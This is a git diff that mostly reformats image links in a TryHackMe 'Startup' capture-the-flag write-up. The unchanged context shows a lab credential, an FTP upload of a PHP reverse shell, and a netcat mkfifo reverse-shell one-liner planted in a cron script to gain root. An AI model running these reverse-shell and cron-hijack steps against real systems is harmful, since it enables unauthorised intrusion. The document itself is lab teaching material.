@@ -149,10 +149,11 @@ Cool. Turning now back to HTTP we can do some directory fuzzing and we find a `/
 
 Looking at the page we find the FTP directory, which we already confirmed we have write access to.
 
-thm_startup_files.png
+![thm_startup_files.png](../assets/startup_assets/thm_startup_files.png)
 
-thm_startup_test.png
+![thm_startup_test.png](../assets/startup_assets/thm_startup_test.png)
 
+### Exploitation
 
 Let's exploit this misconfiguration by uploading a copy of PentestMonkey's PHP reverse shell to the FTP directory:
 ```
@@ -213,7 +214,7 @@ www-data@startup:/home$ cd lennie
 bash: cd: lennie: Permission denied
 ```
 
-thm_startup_1.png
+![thm_startup_1.png](../assets/startup_assets/thm_startup_1.png)
 
 Interestingly, also in `/` is a directory called `incidents` which contains a pcap file:
 
@@ -256,7 +257,7 @@ Lets then use WireShark to interact with the file:
 
 Looking through some of the TCP streams, we see a credential. 
 
-thm_startup_pcap.png
+![thm_startup_pcap.png](../assets/startup_assets/thm_startup_pcap.png)
 
 We can see this doesn't work for user www-data, but we can trying using it for Lennie, and find that it works:
 
@@ -272,11 +273,11 @@ Cool, so now we have a shell as user Lennie: `lennie:c4ntg3t3n0ughsp1c3`
 
 We can now grab the user.txt flag:
 
-thm_startup_user.png
+![thm_startup_user.png](../assets/startup_assets/thm_startup_user.png)
 
 ### Privilege Escalation
 
-In Lennies directory we find another directory called scripts, which contains a file called planner.sh, which lennie has read and execute privileges to:
+In Lennie's directory we find another directory called scripts, which contains a file called planner.sh, which lennie has read and execute privileges to:
 
 ```
 lennie@startup:~/scripts$ ls -la
@@ -321,11 +322,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.72.91 9001 >/tmp/f
 
 Then we simply wait for the cronjob and catch our root shell:
 
-thm_startup_shell.png
+![thm_startup_shell.png](../assets/startup_assets/thm_startup_shell.png)
 
 Lastly, we can grab the final flag:
 
-thm_startup_root.png
+![thm_startup_root.png](../assets/startup_assets/thm_startup_root.png)
 
 Thanks for following along!
 
